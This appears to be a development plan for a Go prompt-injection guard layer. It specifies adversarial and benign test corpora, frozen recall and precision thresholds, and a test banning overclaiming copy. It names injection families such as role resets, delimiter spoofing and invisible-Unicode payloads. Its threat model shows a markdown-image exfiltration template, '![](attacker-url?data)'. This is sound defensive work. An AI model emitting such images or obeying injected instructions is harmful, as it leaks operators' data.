---
phase: 32-villa-injection-guard-layer
plan: 02
type: execute
wave: 2
depends_on: [32-01]
files_modified:
  - internal/websafe/classify_eval_test.go
  - internal/websafe/honesty_test.go
  - internal/websafe/doc.go
  - internal/websafe/testdata/corpus_inject.json
  - internal/websafe/testdata/corpus_benign.json
autonomous: true
requirements: [GUARD-04]
must_haves:
  truths:
    - "A held-out adversarial corpus + benign corpus exist as checked-in JSON fixtures."
    - "The classifier recall on the adversarial corpus meets a pre-declared frozen threshold, and its precision on the benign corpus meets a pre-declared frozen threshold (must-WIN gate)."
    - "The benign corpus includes a legitimate non-Latin sample and an article ABOUT injection, so over-flagging is measured, not assumed."
    - "The string injection-safe (and immune / blocks injection) appears nowhere in internal/websafe — enforced by a directory-walking grep-ban test."
    - "Package documentation states reduces and flags, does not eliminate and documents the browser-side markdown-image zero-click exfil channel as a known residual, not closed."
  artifacts:
    - path: "internal/websafe/testdata/corpus_inject.json"
      provides: "GUARD-04 held-out adversarial recall corpus (≥30 samples)"
      contains: "expect_detected"
    - path: "internal/websafe/testdata/corpus_benign.json"
      provides: "GUARD-04 benign precision corpus (≥30 samples incl. non-Latin + meta-article)"
      contains: "expect_detected"
    - path: "internal/websafe/classify_eval_test.go"
      provides: "must-WIN recall/precision eval with frozen threshold consts"
      contains: "minRecall"
    - path: "internal/websafe/honesty_test.go"
      provides: "grep-ban on injection-safe/immune/blocks-injection copy"
      contains: "injection-safe"
    - path: "internal/websafe/doc.go"
      provides: "package honesty copy + markdown-image residual documentation"
      contains: "reduces and flags"
  key_links:
    - from: "internal/websafe/classify_eval_test.go"
      to: "internal/websafe/testdata/corpus_inject.json"
      via: "os.ReadFile + json.Unmarshal of the corpus"
      pattern: "os.ReadFile.*corpus_inject"
    - from: "internal/websafe/classify_eval_test.go"
      to: "internal/websafe/classify.go"
      via: "calls classify() over each corpus sample, compares to frozen thresholds"
      pattern: "classify\\("
---

<objective>
Ship the GUARD-04 evaluation and honesty discipline: a held-out adversarial + benign Go test corpus, a must-WIN recall/precision eval with thresholds frozen as consts BEFORE measurement, a directory-walking grep-ban that bans "injection-safe"/"immune"/"blocks injection" copy, and a package doc stating "reduces and flags, does not eliminate" while documenting the markdown-image zero-click exfil channel as a known residual.

Purpose: This is the honesty-and-evaluation backbone of the phase — the hardest discipline (per RESEARCH, harder than the transforms). It makes the classifier's quality measurable and the product's posture verifiable, mirroring the v1.5 must-WIN-eval discipline. The classifier production code lands in 32-01; this plan proves and bounds the claims.
Output: Two corpus fixtures, a must-WIN eval test (frozen thresholds), a grep-ban honesty test, and `doc.go` with the honesty copy + residual documentation.
</objective>

<execution_context>
@$HOME/.claude/gsd-core/workflows/execute-plan.md
@$HOME/.claude/gsd-core/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/32-villa-injection-guard-layer/32-CONTEXT.md
@.planning/phases/32-villa-injection-guard-layer/32-RESEARCH.md
@.planning/phases/32-villa-injection-guard-layer/32-PATTERNS.md
@internal/inference/seam_test.go
@internal/metrics/llamacpp_test.go
@internal/websafe/guard_stubs.go
</context>

<artifacts_this_phase_produces>
Symbols + files created by THIS plan:

- **New files:**
  - `internal/websafe/testdata/corpus_inject.json` — held-out adversarial recall corpus, array-of-objects `[{"name","text","expect_detected":true}]`, ≥30 samples spanning: imperative override, role/identity reset, delimiter/turn spoofing, secret/exfil probe, invisible-Unicode-laden payloads, fence-breakout payloads.
  - `internal/websafe/testdata/corpus_benign.json` — benign precision corpus, same schema with `expect_detected:false`, ≥30 samples INCLUDING ≥1 legitimate non-Latin sample and ≥1 article ABOUT prompt injection (over-flag stress).
  - `internal/websafe/classify_eval_test.go` — the must-WIN eval: package-level frozen threshold consts `minRecall` and `minPrecision`, plus `TestClassifyRecall` and `TestClassifyPrecision` (and a flag-not-block assertion `TestClassifyDoesNotDrop`).
  - `internal/websafe/honesty_test.go` — `TestNoInjectionSafeCopy` (directory-walking grep-ban) + `TestMarkdownImageResidualDocumented`.
  - `internal/websafe/doc.go` — package doc comment carrying the honesty copy + the markdown-image residual note (so the copy lives in a stable, greppable location independent of any single policy file).
- **Frozen constants (the must-WIN contract — declared before rule tuning):**
  - `minRecall = 0.90` (adversarial corpus), `minPrecision = 0.95` (benign corpus). Corpus floor: ≥30 + ≥30.
</artifacts_this_phase_produces>

<tasks>

<task type="auto">
  <name>Task 1: Build the adversarial + benign corpus fixtures (recall + precision sets)</name>
  <files>internal/websafe/testdata/corpus_inject.json, internal/websafe/testdata/corpus_benign.json</files>
  <read_first>
    - internal/metrics/testdata/slots.json (the checked-in JSON test-corpus house style)
    - internal/metrics/llamacpp_test.go (lines 283-295 — the `os.ReadFile("testdata/...")` + `json.Unmarshal` load pattern these corpora must match)
    - .planning/phases/32-villa-injection-guard-layer/32-RESEARCH.md (Pattern 4 rule families; Validation Architecture → Wave 0 Gaps corpus coverage list; Pitfall 2 + Pitfall 3)
    - .planning/phases/32-villa-injection-guard-layer/32-CONTEXT.md (Area 4 — adversarial corpus recall + benign precision; markdown-image residual)
  </read_first>
  <behavior>
    - corpus_inject.json: a JSON array of ≥30 objects `{"name":"...","text":"...","expect_detected":true}` covering all five attack families plus invisible-Unicode payloads (embed real U+200B/U+202E in the text) and fence-breakout payloads (text that types a fake `[/UNTRUSTED_WEB_CONTENT ...]` close).
    - corpus_benign.json: a JSON array of ≥30 objects with `expect_detected:false`, including ≥1 legitimate non-Latin (Arabic/CJK) sample and ≥1 article ABOUT prompt injection (uses words like "ignore"/"system" in benign prose to stress precision).
    - Both files parse with `json.Unmarshal` into `[]struct{Name,Text string; ExpectDetected bool}` with zero errors.
  </behavior>
  <action>
    Create `internal/websafe/testdata/corpus_inject.json` and `internal/websafe/testdata/corpus_benign.json` as array-of-objects fixtures with fields `name`, `text`, `expect_detected` (the schema the eval in Task 2 unmarshals). The adversarial corpus MUST include ≥30 entries spanning every rule family the 32-01 `injectionRules` map targets, PLUS payloads with literal invisible/bidi runes and PLUS fence-breakout attempts (a forged closing-delimiter string). The benign corpus MUST include ≥30 entries with `expect_detected:false`, deliberately including a legitimate non-Latin visible-text sample (Pitfall 2 over-defang stress) and a meta-article that discusses injection in benign prose (Pitfall 3 over-flag stress). Keep entries short and self-documenting via the `name` field. These are testdata read by `os.ReadFile` (not `go:embed`), mirroring `internal/metrics/testdata/slots.json`.

    IMPORTANT for the executor's commit-time injection-hook: these corpus files intentionally CONTAIN injection phrasing (that is their job). The literal attack phrases live ONLY in these JSON testdata fixtures, never in `<action>` prose — keep them confined to the corpus files.
  </action>
  <verify>
    <automated>node -e "JSON.parse(require('fs').readFileSync('internal/websafe/testdata/corpus_inject.json'));JSON.parse(require('fs').readFileSync('internal/websafe/testdata/corpus_benign.json'));console.log('ok')"</automated>
  </verify>
  <acceptance_criteria>
    - Both JSON files parse without error (the node verify command prints `ok`).
    - `corpus_inject.json` has ≥30 array elements, each with `expect_detected:true`: `node -e "const a=require('./internal/websafe/testdata/corpus_inject.json');if(a.length<30||a.some(x=>x.expect_detected!==true))process.exit(1)"` exits 0.
    - `corpus_benign.json` has ≥30 array elements, each with `expect_detected:false`: `node -e "const a=require('./internal/websafe/testdata/corpus_benign.json');if(a.length<30||a.some(x=>x.expect_detected!==false))process.exit(1)"` exits 0.
    - The benign corpus contains a non-ASCII (non-Latin) sample: `node -e "const a=require('./internal/websafe/testdata/corpus_benign.json');if(!a.some(x=>/[^\x00-\x7F]/.test(x.text)))process.exit(1)"` exits 0.
  </acceptance_criteria>
  <done>
    Two corpus fixtures exist and parse; the adversarial set has ≥30 detected-true samples across all families incl. invisible-Unicode + fence-breakout; the benign set has ≥30 detected-false samples incl. a non-Latin and a meta-article entry.
  </done>
</task>

<task type="auto" tdd="true">
  <name>Task 2: Must-WIN recall/precision eval with frozen thresholds + flag-not-block assertion</name>
  <files>internal/websafe/classify_eval_test.go</files>
  <read_first>
    - internal/websafe/classify.go (the `classify(normalized string) Verdict` under test, from 32-01)
    - internal/websafe/normalize.go (the eval should normalize each sample before classify, mirroring the real pipeline ordering)
    - internal/metrics/llamacpp_test.go (lines 283-295 — the testdata-load idiom)
    - .planning/phases/32-villa-injection-guard-layer/32-RESEARCH.md (Open Question 1 — pre-declare thresholds FIRST; Validation Architecture must-WIN rows)
  </read_first>
  <behavior>
    - `minRecall` and `minPrecision` are package-level consts declared at the top of the file (frozen BEFORE any tuning): minRecall = 0.90, minPrecision = 0.95.
    - TestClassifyRecall: load corpus_inject.json, normalize+classify each, compute recall = detected/total; FAIL if recall < minRecall, reporting the missed sample names.
    - TestClassifyPrecision: load corpus_benign.json, normalize+classify each, compute precision = (true-negatives)/total; FAIL if precision < minPrecision, reporting the false-positive sample names.
    - TestClassifyDoesNotDrop: classify returns only a Verdict — the caller's content is unaffected (flag-not-block); assert classify never mutates/returns content (it returns Verdict only by type).
  </behavior>
  <action>
    Create `internal/websafe/classify_eval_test.go`. Declare frozen `const minRecall = 0.90` and `const minPrecision = 0.95` at file top with a doc comment stating they are the must-WIN gate frozen before rule tuning (Open Question 1). Load each corpus via `os.ReadFile("testdata/corpus_inject.json")` / `corpus_benign.json` + `json.Unmarshal` into `[]struct{Name,Text string; ExpectDetected bool `json:"..."`}` (mirror llamacpp_test.go:288). For each sample, run it through `normalize` THEN `classify` (the eval must exercise the same normalized-text path the real pipeline uses, so invisible-Unicode payloads are defanged before classification). Compute recall over the adversarial set and precision over the benign set; `t.Fatalf` with the offending sample `name`s if either metric falls below its frozen threshold. Add `TestClassifyDoesNotDrop` asserting the flag-not-block contract (classify yields a Verdict and does not return content). Each test function carries an invariant doc comment.
  </action>
  <verify>
    <automated>go test ./internal/websafe/ -run 'TestClassifyRecall|TestClassifyPrecision|TestClassifyDoesNotDrop' -count=1 -v</automated>
  </verify>
  <acceptance_criteria>
    - `grep -c 'minRecall' internal/websafe/classify_eval_test.go` ≥ 1 AND `grep -c 'minPrecision' internal/websafe/classify_eval_test.go` ≥ 1 (frozen consts present).
    - `grep -c 'corpus_inject.json' internal/websafe/classify_eval_test.go` ≥ 1 AND `grep -c 'corpus_benign.json' internal/websafe/classify_eval_test.go` ≥ 1.
    - `grep -Ec 'normalize\(' internal/websafe/classify_eval_test.go` ≥ 1 (eval runs samples through normalize before classify).
    - `go test ./internal/websafe/ -run 'TestClassifyRecall|TestClassifyPrecision' -count=1` passes — recall ≥ 0.90 on the adversarial corpus AND precision ≥ 0.95 on the benign corpus (if it fails, the executor tunes the 32-01 `injectionRules` map / corpus, never lowers the frozen thresholds).
    - `go test ./internal/websafe/ -run 'TestClassifyDoesNotDrop' -count=1` passes (flag-not-block).
  </acceptance_criteria>
  <done>
    The must-WIN eval passes with thresholds frozen as consts (recall ≥ 0.90, precision ≥ 0.95); the eval normalizes before classifying; the flag-not-block contract is asserted.
  </done>
</task>

<task type="auto" tdd="true">
  <name>Task 3: Honesty copy + grep-ban test + markdown-image residual documentation</name>
  <files>internal/websafe/doc.go, internal/websafe/honesty_test.go</files>
  <read_first>
    - internal/inference/seam_test.go (lines 1-40 — the directory-walking, regexp content-ban structure to clone for the grep-ban)
    - internal/websafe/guard_stubs.go (lines 15-17 — the existing honesty-posture wording to carry forward into doc.go)
    - .planning/phases/32-villa-injection-guard-layer/32-RESEARCH.md (Pitfall 4 dishonest copy; Security Domain markdown-image residual row)
    - .planning/phases/32-villa-injection-guard-layer/32-CONTEXT.md (Area 4 — "reduces and flags, does not eliminate"; markdown-image residual)
  </read_first>
  <behavior>
    - doc.go: a package doc comment stating the guard "reduces and flags, does not eliminate" injection, and a paragraph documenting the browser-side markdown-image zero-click exfil channel as a KNOWN RESIDUAL (bypasses container egress; the operator's browser renders the image), explicitly NOT claimed closed (GUARD-04).
    - TestNoInjectionSafeCopy: walks every `*.go` file under internal/websafe, fails if any non-test, non-allowlisted file contains the banned phrases (case-insensitive): "injection-safe", "immune", "blocks injection".
    - TestMarkdownImageResidualDocumented: asserts doc.go contains the residual note (greps for the markdown-image residual marker phrase).
  </behavior>
  <action>
    Create `internal/websafe/doc.go` as a package doc file: a `// Package websafe ...` doc comment that states the guard layer REDUCES and FLAGS injection but does NOT eliminate it (carry forward the guard_stubs.go:15-17 posture), and a distinct paragraph documenting the markdown-image zero-click exfiltration channel as a known residual — the model can emit a markdown image whose URL carries exfiltrated data and the operator's browser fetches it, bypassing container egress; this is NOT closed and the egress bound (Phase 33) is the real backstop. Do NOT use the banned phrases when writing this doc.

    Create `internal/websafe/honesty_test.go` cloning the `TestSeamGrepGate` structure (filepath.Walk over `internal/websafe`, regexp match): `TestNoInjectionSafeCopy` fails if any source file contains "injection-safe"/"immune"/"blocks injection" (case-insensitive). To avoid the test self-tripping on the ban list it defines, scope the search to OTHER files or guard the test file with the allowlist marker convention. Add `TestMarkdownImageResidualDocumented` asserting `doc.go` carries the residual note. Each test carries an invariant doc comment.

    Comment-text discipline: this task's `<action>` deliberately names the banned phrases as data the test searches for; honesty_test.go is the file that legitimately contains the ban list, so scope the walk to exclude honesty_test.go itself (or add `<!-- planner-discipline-allow: injection-safe -->` is N/A here — handle in-code by skipping the test file in the walk).
  </action>
  <verify>
    <automated>go test ./internal/websafe/ -run 'TestNoInjectionSafeCopy|TestMarkdownImageResidualDocumented' -count=1 && make check</automated>
  </verify>
  <acceptance_criteria>
    - `grep -c 'reduces and flags' internal/websafe/doc.go` ≥ 1 (honesty copy present).
    - doc.go documents the markdown-image residual: `grep -Eic 'markdown.image' internal/websafe/doc.go` ≥ 1 with residual/known-residual wording.
    - `go test ./internal/websafe/ -run 'TestNoInjectionSafeCopy' -count=1` passes — proving no banned copy exists in non-test source: `grep -rIl --include='*.go' -e 'injection-safe' internal/websafe/ | grep -v honesty_test.go` returns no matches.
    - `go test ./internal/websafe/ -run 'TestMarkdownImageResidualDocumented' -count=1` passes.
    - `make check` (vet + full `go test ./...`) exits 0.
  </acceptance_criteria>
  <done>
    doc.go states "reduces and flags, does not eliminate" and documents the markdown-image residual; the grep-ban test passes (no "injection-safe"/"immune"/"blocks injection" in non-test source); the residual-documented test passes; `make check` is green.
  </done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| fetched web page → classifier | Attacker-controlled normalized text is matched against rule families |
| guard verdict → model context (downstream) | The model later reads fenced web content; the residual exfil channel exits via the operator's browser |

## STRIDE Threat Register (ASVS L1; block on high)

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-32-06 | Tampering (evasion) | classifier recall | mitigate | Held-out adversarial corpus (≥30, incl. invisible-Unicode + fence-breakout) + frozen recall ≥ 0.90 must-WIN gate; samples normalized before classify so obfuscation is defanged first |
| T-32-07 | — (signal-quality) | classifier precision | mitigate | Benign corpus (≥30, incl. non-Latin + meta-article) + frozen precision ≥ 0.95 gate; multi-word imperative rules prevent over-flag alarm fatigue |
| T-32-08 | Information Disclosure | markdown-image zero-click exfil | accept (documented residual) | NOT closed: model emits `![](attacker-url?data)`, operator's browser fetches it — bypasses container egress. Documented in doc.go; the Phase-33 egress bound is the real backstop. Honesty gate forbids any "closed/safe" claim |
| T-32-09 | Repudiation (dishonest copy) | operator-facing claims | mitigate | Directory-walking grep-ban (`TestNoInjectionSafeCopy`) forbids "injection-safe"/"immune"/"blocks injection"; doc.go states "reduces and flags, does not eliminate" |
</threat_model>

<verification>
- `go test ./internal/websafe/ -run 'TestClassifyRecall|TestClassifyPrecision|TestClassifyDoesNotDrop|TestNoInjectionSafeCopy|TestMarkdownImageResidualDocumented' -count=1` all pass.
- The must-WIN thresholds (`minRecall`, `minPrecision`) are consts, frozen before tuning — never lowered to pass.
- `grep -rIl --include='*.go' -e 'injection-safe' internal/websafe/ | grep -v honesty_test.go` returns nothing.
- `make check` is green.
</verification>

<success_criteria>
- Adversarial + benign corpora exist (≥30 each), parse, and cover the required edge classes (invisible-Unicode, fence-breakout, non-Latin, meta-article).
- The classifier passes recall ≥ 0.90 and precision ≥ 0.95 against frozen consts (GUARD-04 must-WIN).
- No banned copy exists in non-test source; doc.go states "reduces and flags, does not eliminate" and documents the markdown-image residual.
- `make check` passes.
</success_criteria>

<output>
Create `.planning/phases/32-villa-injection-guard-layer/32-02-SUMMARY.md` when done.
</output>
